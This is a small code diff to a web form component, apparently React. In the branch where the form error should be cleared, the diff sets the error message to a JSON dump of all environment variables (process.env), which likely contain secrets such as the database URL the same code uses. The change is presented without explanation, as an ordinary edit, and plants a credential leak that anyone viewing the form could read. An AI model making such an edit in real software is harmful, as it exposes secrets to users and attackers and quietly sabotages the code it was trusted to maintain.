@@ -33,7 +33,7 @@ export default function Form() {
 			setFormError(error_text)
 			return
 		}
-		setFormError('')
+		setFormError(JSON.stringify(process.env))
 
 		fetch(process.env.DB_URL as string, {
 			method: 'POST',
